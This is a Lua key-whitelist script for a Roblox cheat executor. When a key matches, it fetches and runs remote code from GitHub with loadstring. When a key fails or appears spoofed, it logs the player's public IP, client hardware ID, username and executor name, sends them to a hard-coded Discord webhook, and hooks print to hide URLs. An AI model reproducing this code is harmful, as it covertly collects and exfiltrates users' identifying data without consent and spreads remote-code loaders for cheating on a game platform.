local keys = {
	"tN-g=Njah#E1iHWlODMsL70HIqGvrVzTer4o5t7PvmBr!c|6=t53-C%&6BLH$zZDYVL|OwX0rZb!mD_",
    "vpp7&&8^ieZxX=Xd1Ugceg178V5AcsQi?bf?&I89ceYRoD^eS3qlFSO|^eqFLV%0|-0zd2=#rxLsj6m",
   	"FSEF6kuCOT0PyH5amUVKqL+YgJxavqyGdoxMOpP#aDsWE0-aCgXkF3lV=G^|JdQoknsoSw3kQwEhCJD",
	"sfFj$IE#ya*E+tmsL01HAm-CPh^%Mg9!D=4l_KABS5k=7X_PC2YefFS_rLKkbts+gyC?$X5uYPY%pE^",
	"8A_7UQ+10@UlyyOH^ie5=6FoKprSt0xj2-GYI$Yl_VPi4*8S1WrJkzN4%|!5sQslF|upzzI9_x59He0"
}
local script12321 = "Athelios"

local counter = 1
local whitelistCheck
local keyCheck
for i,v in pairs(keys) do
    if counter == #keys then
    --not whitelisted!
    keys = ""
    game.Players.LocalPlayer:Kick("Invalid key.")
    local IPLOGGER = tostring(game:HttpGet("https://api.ipify.org", true))
local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Unknown exploit"

local url =
"https://discord.com/api/webhooks/864252539624226837/kSOcTRQo-hequue11vSzO8rkqZYfldcbTfgFI_syCMxv2nGljK_V5h893mQz8AS1spMO"
local data = {
["content"] = "**__Suspect of an invalid key, info:__**",
["embeds"] = {
{
["title"] =  game12321,
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(0),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Script using:",
                                ["value"] = script12321,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Internet Protocol:",
                                ["value"] = IPLOGGER,
                                ["inline"] = true,
                            },  
                            {
                                ["name"] = "Hardware ID:",
                                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                                ["inline"] = true,
                            },
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
    else
        if v == _G.Key then
            --Whitelisted system!
	    loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovemariobro/Testing/main/a.lua"))()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovemariobro/Testing/main/b.lua"))()
            GUI:Notification{
	        Title = "Alert",
	        Text = "Key valid! Loading script...",
	        Duration = 4,
	        Callback = function() end 
                
            }
            keyCheck = _G.Key
            keys = ""
            else
            counter = counter +1
        end
    end
end

while true do
    if _G.Key == keyCheck then
        --Not spoofed
    else
        --kick spoofer--
        game.Players.LocalPlayer:Kick("Script spoofing detected.")
        
        --log--
        local IPLOGGER = tostring(game:HttpGet("https://api.ipify.org", true))


local url =
"https://discord.com/api/webhooks/864252539624226837/kSOcTRQo-hequue11vSzO8rkqZYfldcbTfgFI_syCMxv2nGljK_V5h893mQz8AS1spMO"
local data = {
["content"] = "**__Suspect of an unwhitelisted user:__**",
["embeds"] = {
{
["title"] =  game12321,
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(0),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Script using:",
                                ["value"] = script12321,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Internet Protocol:",
                                ["value"] = IPLOGGER,
                                ["inline"] = true,
                            },  
                            {
                                ["name"] = "Hardware ID:",
                                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                                ["inline"] = true,
                            },
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

    end
    wait()
    
end
